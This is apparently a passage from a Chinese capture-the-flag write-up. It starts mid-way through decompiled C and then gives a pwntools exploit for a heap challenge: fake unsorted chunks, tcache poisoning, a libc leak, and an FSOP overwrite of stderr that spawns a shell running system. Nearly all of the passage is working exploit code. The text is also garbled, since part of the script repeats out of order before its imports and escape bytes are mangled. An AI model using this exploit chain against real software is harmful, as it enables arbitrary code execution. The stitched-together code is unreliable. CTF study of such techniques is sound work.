 puts("guava overload");
 exit(0);
 }
 free((void *)guava_gius[v1]);
 return v2 - __readfsqword(0x28u);
}
def meau(index):
 p.recvuntil('*>',timeout = 1)
 p.sendline(str(index))

def add(size,index=0,content=b'a'):
 meau(1)
 p.recvuntil('how many guavas:')
 p.sendline(str(size))
 p.recvuntil('guavset:',timeout=1)
 p.sendline(str(index))
 p.recvuntil('guavas:')
 p.send(content)

def free(index):
 meau(2)
 p.recvuntil('guava no:')
 p.sendline(str(index))
add(0x600) # 7
add(0x600) # 8 fake 0x30
add(0x600) # 9
add(0x500) # 10
free(7)
free(8)
free(9)
add(0x610) # 11
add(0x500) # 12 unsorted_start
free(11)
free(12)
add(0x610,0x608,p64(0x31)) # 13
free(13)
free(8)
add(0x610) # 14
add(0x500) # 15 unsorted_start
add(0x6e0) # 16
add(0x600) # 7
add(0x600) # 8 fake 0x30
add(0x600) # 9
add(0x500) # 10
free(7)
free(8)
free(9)
add(0x610) # 11
add(0x500) # 12 unsorted_start
free(11)
free(12)
add(0x610,0x608,p64(0x31)) # 13
free(13)
free(8)
add(0x610) # 14
add(0x500) # 15 unsorted_start
add(0x6e0) # 16
free(15) # free unsorted_start
add(0x600) # 17
add(0x600) # 18 fake 0x20
add(0x600) # 19
add(0x500) # 20
free(17)
free(18)
free(19)
add(0x610) # 21
add(0x500) # 22 unsorted_end
free(21)
free(22)
add(0x610,0x608,p64(0x21)) # 23
free(23)
free(18)
add(0x610) # 24
add(0x500) # 25 unsorted_end
add(0x6e0) # 26
add(0x500) # 27 unsorted_middle
add(0x600) # 28
add(0x3e8) # 29
add(0x3d8) # 30
free(29)
free(30)
# 获取一个 tcache 的索引，该 tcache 能够修改 fake 0x30 和 unsorted_start
 free(14)
 free(15)
 add(0x300) # 31
 add(0x300-0x20) # 32
 add(0x330) # 33 change unsorted_start
 free(33)
 add(0x1e0) # 34

 # 获取一个 tcache 的索引，该 tcache 能够修改 fake 0x20 和 unsorted_end
 free(24)
 free(25)
 add(0x300) # 35
 add(0x300-0x20) # 36
 add(0x340) # 37 change unsorted_end
 free(37)
 add(0x1d0) # 38
add(0x330,0x18,p64(0x511)) # 39
 free(39)
 add(0x340,0x18,p64(0x511)) # 40
 free(40)
for i in range(36):
 add(0x500)

add(0x210) # 76
add(0x30,0x20,p64(0x10000)+p64(0x20)) # 77
add(0x238) #78
add(0x248) #79
free(78)
free(79)
# 依次释放 unsorted_end、unsorted_middle、unsorted_start
free(25)
free(27)
free(15)

# 令 unsorted_start 的 fd 指针和 unsorted_end 的 bk 指针指向 fake unsorted chunk
add(0x330,0x20,p16(0x0080)) # 80
free(80)
add(0x340,0x28,p16(0x0080)) # 81
free(81)
add(0x500)
add(0x500)
add(0x100,0,p16(0x2780))
add(0x100,0,p16(0x2780))
add(0x230,0,p64(0xfbad1800)+p64(0)*3+b'x00x00')
p.recvuntil(b'x7f',timeout=1)
libc_base = u64(p.recvuntil(b'x7f',timeout=1)[-6:].ljust(8,b'x00'))-0x219aa0
free(86)
add(0x100,0x8,p64(libc_base+libc.symbols['_IO_2_1_stderr_']))

fake_file = flat({
 0x0: b" sh;",
 0x28: libc_base + libc.symbols['system'],
 0x88: libc_base + libc.symbols['_environ']-0x10,
 0xa0: libc_base+libc.symbols['_IO_2_1_stderr_']-0x40, # _wide_data
 0xD8: libc_base + libc.symbols['_IO_wfile_jumps'], # jumptable
}, filler=b"x00")
from pwn import *
from LibcSearcher import *
from ctypes import *
from struct import pack
import numpy as np
import base64
from bisect import *

context(arch='amd64', os='linux', log_level='debug')
context.terminal = ['wt.exe', '-w', "0", "sp", "-d", ".", "wsl.exe", "-d", "Ubuntu-22.04", "bash", "-c"]
elf = ELF('./pwn')
libc = ELF('./libc.so.6')
# ld = ELF('./ld-2.31.so')

def lg(buf):
 global heap_base
 global libc_base
 global target
 global temp
 global stack
 global leak
 log.success(f' 33[33m{buf}:{eval(buf):#x} 33[0m')

def meau(index):
 p.recvuntil('*>',timeout = 1)
 p.sendline(str(index))

def add(size,index=0,content=b'a'):
 meau(1)
 p.recvuntil('how many guavas:')
 p.sendline(str(size))
 p.recvuntil('guavset:',timeout=1)
 p.sendline(str(index))
 p.recvuntil('guavas:')
 p.send(content)

def free(index):
 meau(2)
 p.recvuntil('guava no:')
 p.sendline(str(index))

while True:
 p = process(["./ld-linux-x86-64.so.2", "./pwn"],
 env={"LD_PRELOAD":"./libc.so.6"})

 # 这两个循环为多余操作，当时脑抽写的，后面懒的删了
 for i in range(7):
 add(0x88)

 for i in range(7):
 free(i)

 # 获取 fake 0x30 和 unsorted_start 堆块的索引
 add(0x600) # 7
 add(0x600) # 8 fake 0x30
 add(0x600) # 9
 add(0x500) # 10
 free(7)
 free(8)
 free(9)
 add(0x610) # 11
 add(0x500) # 12 unsorted_start
 free(11)
 free(12)
 add(0x610,0x608,p64(0x31)) # 13
 free(13)
 free(8)
 add(0x610) # 14
 add(0x500) # 15 unsorted_start
 add(0x6e0) # 16

 # 获取 fake 0x20 和 unsorted_end 堆块的索引
 add(0x600) # 17
 add(0x600) # 18 fake 0x20
 add(0x600) # 19
 add(0x500) # 20
 free(17)
 free(18)
 free(19)
 add(0x610) # 21
 add(0x500) # 22 unsorted_end
 free(21)
 free(22)
 add(0x610,0x608,p64(0x21)) # 23
 free(23)
 free(18)
 add(0x610) # 24
 add(0x500) # 25 unsorted_end
 add(0x6e0) # 26

 # 获取 unsorted_middle 的索引
 add(0x500) # 27 unsorted_middle
 add(0x600) # 28

 # 伪造 fake unsorted chunk （size、fd、bk）
 add(0x3e8) # 29
 add(0x3d8) # 30
 free(29)
 free(30)

 # 获取一个 tcache 的索引，该 tcache 能够修改 fake 0x30 和 unsorted_start
 free(14)
 free(15)
 add(0x300) # 31
 add(0x300-0x20) # 32
 add(0x330) # 33 change unsorted_start
 free(33)
 add(0x1e0) # 34

 # 获取一个 tcache 的索引，该 tcache 能够修改 fake 0x20 和 unsorted_end
 free(24)
 free(25)
 add(0x300) # 35
 add(0x300-0x20) # 36
 add(0x340) # 37 change unsorted_end
 free(37)
 add(0x1d0) # 38

 add(0x330,0x18,p64(0x511)) # 39
 free(39)
 add(0x340,0x18,p64(0x511)) # 40
 free(40)

 # 在后面填充堆块，并伪造 prev_size 和 size 使 fake unsorted chunk 合法
 for i in range(36):
 add(0x500)

 add(0x210) # 76
 add(0x30,0x20,p64(0x10000)+p64(0x20)) # 77
 # 提前让 0x240、0x250 两个大小的堆块进入到 tcache，后面会用上
 add(0x238) #78
 add(0x248) #79
 free(78)
 free(79)
 # 依次释放 unsorted_end、unsorted_middle、unsorted_start
 free(25)
 free(27)
 free(15)

 # 令 unsorted_start 的 fd 指针和 unsorted_end 的 bk 指针指向 fake unsorted chunk
 add(0x330,0x20,p16(0x0080)) # 80
 free(80)
 add(0x340,0x28,p16(0x0080)) # 81
 free(81)
 try:
 add(0x500) # 82
 
except:
 p.close()
 continue

 # 将多余的 largebin 申请出来
 add(0x500) # 83

 # 修改
 add(0x100,0,p16(0x2780)) # 84
 add(0x100,0,p16(0x2780)) # 85
 try:
 add(0x230,0,p64(0xfbad1800)+p64(0)*3+b'x00x00') # 86
 
except:
 p.close()
 continue
 libc_base = 0
 try:
 p.recvuntil(b'x7f',timeout=1)
 libc_base = u64(p.recvuntil(b'x7f',timeout=1)[-6:].ljust(8,b'x00'))-0x219aa0
 if hex(libc_base)[2] != '7' or hex(libc_base)[3] != 'f':
 raise ValueError("leak libc error")
 
except:
 p.close()
 continue

 lg("libc_base")

 # 释放 tcache_perthread_struct 上的堆块，使我们能够再次编辑该结构体
 free(86)

 # 令 size 为 0x250 的 tcache 指向 _IO_2_1_stderr_
 add(0x100,0x8,p64(libc_base+libc.symbols['_IO_2_1_stderr_'])) # 87

 fake_file = flat({
 0x0: b" sh;",
 0x28: libc_base + libc.symbols['system'],
 0x88: libc_base + libc.symbols['_environ']-0x10,
 0xa0: libc_base+libc.symbols['_IO_2_1_stderr_']-0x40, # _wide_data
 0xD8: libc_base + libc.symbols['_IO_wfile_jumps'], # jumptable
 }, filler=b"x00")

 # 在 _IO_2_1_stderr_ 上写上我们的 fake file
 add(0x240,0,fake_file)

 # 退出程序，执行 fsop 攻击
 meau(3)
 p.sendline(b'cat flag.txt')

 p.interactive()
 break
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/1-1726627285.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/0-1726627287.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/7-1726627289.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/3-1726627289.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/6-1726627290.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/8-1726627291.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/2-1726627293.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/2-1726627294.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/10-1726627295.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/0-1726627298.png)